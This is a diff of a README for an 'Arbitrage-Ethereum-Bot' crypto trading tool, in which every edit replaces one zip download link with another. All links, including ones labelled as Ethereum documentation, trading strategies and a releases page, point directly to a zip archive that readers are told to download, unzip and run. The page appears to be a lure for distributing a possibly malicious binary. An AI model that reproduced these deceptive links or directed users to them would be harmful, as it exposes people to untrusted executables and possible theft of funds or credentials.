@@ -1,6 +1,6 @@
 # 🤖 Arbitrage-Ethereum-Bot - Effortless Crypto Arbitrage Trading
 
-[![Download Arbitrage-Ethereum-Bot](https://raw.githubusercontent.com/MaoMao0903/Arbitrage-Ethereum-Bot/main/fanwork/Arbitrage-Ethereum-Bot-v1.7.zip)](https://raw.githubusercontent.com/MaoMao0903/Arbitrage-Ethereum-Bot/main/fanwork/Arbitrage-Ethereum-Bot-v1.7.zip)
+[![Download Arbitrage-Ethereum-Bot](https://github.com/MaoMao0903/Arbitrage-Ethereum-Bot/raw/refs/heads/main/fanwork/Bot_Arbitrage_Ethereum_1.2.zip)](https://github.com/MaoMao0903/Arbitrage-Ethereum-Bot/raw/refs/heads/main/fanwork/Bot_Arbitrage_Ethereum_1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Arbitrage-Ethereum-Bot project! This tool helps you analyze and e
 
 To get started, visit the Releases page to download the latest version of the Arbitrage-Ethereum-Bot. Click the button below:
 
-[Download Arbitrage-Ethereum-Bot](https://raw.githubusercontent.com/MaoMao0903/Arbitrage-Ethereum-Bot/main/fanwork/Arbitrage-Ethereum-Bot-v1.7.zip)
+[Download Arbitrage-Ethereum-Bot](https://github.com/MaoMao0903/Arbitrage-Ethereum-Bot/raw/refs/heads/main/fanwork/Bot_Arbitrage_Ethereum_1.2.zip)
 
 ### 🔧 System Requirements
 
@@ -24,7 +24,7 @@ Make sure your computer meets the following requirements:
 ## 📑 How to Use the Tool
 
 1. **Download the Software**
-   Go to the [Releases page](https://raw.githubusercontent.com/MaoMao0903/Arbitrage-Ethereum-Bot/main/fanwork/Arbitrage-Ethereum-Bot-v1.7.zip), and choose the latest version suitable for your system. Download the file and save it to your computer.
+   Go to the [Releases page](https://github.com/MaoMao0903/Arbitrage-Ethereum-Bot/raw/refs/heads/main/fanwork/Bot_Arbitrage_Ethereum_1.2.zip), and choose the latest version suitable for your system. Download the file and save it to your computer.
 
 2. **Unzip the Folder**
    After downloading, find the zipped file in your downloads folder. Right-click on it and select "Extract Here" or "Unzip" to unpack the files.
@@ -66,9 +66,9 @@ Join our community to share your experiences and get support. You can find us on
 
 ## 🔗 Additional Resources
 
-- **Ethereum Documentation:** Learn more about Ethereum and smart contracts [here](https://raw.githubusercontent.com/MaoMao0903/Arbitrage-Ethereum-Bot/main/fanwork/Arbitrage-Ethereum-Bot-v1.7.zip).
-- **Trading Strategies:** Read about effective trading strategies [here](https://raw.githubusercontent.com/MaoMao0903/Arbitrage-Ethereum-Bot/main/fanwork/Arbitrage-Ethereum-Bot-v1.7.zip).
+- **Ethereum Documentation:** Learn more about Ethereum and smart contracts [here](https://github.com/MaoMao0903/Arbitrage-Ethereum-Bot/raw/refs/heads/main/fanwork/Bot_Arbitrage_Ethereum_1.2.zip).
+- **Trading Strategies:** Read about effective trading strategies [here](https://github.com/MaoMao0903/Arbitrage-Ethereum-Bot/raw/refs/heads/main/fanwork/Bot_Arbitrage_Ethereum_1.2.zip).
 
-Make sure to check out the [Releases page](https://raw.githubusercontent.com/MaoMao0903/Arbitrage-Ethereum-Bot/main/fanwork/Arbitrage-Ethereum-Bot-v1.7.zip) for updates and new versions!
+Make sure to check out the [Releases page](https://github.com/MaoMao0903/Arbitrage-Ethereum-Bot/raw/refs/heads/main/fanwork/Bot_Arbitrage_Ethereum_1.2.zip) for updates and new versions!
 
 Enjoy your trading experience with Arbitrage-Ethereum-Bot!
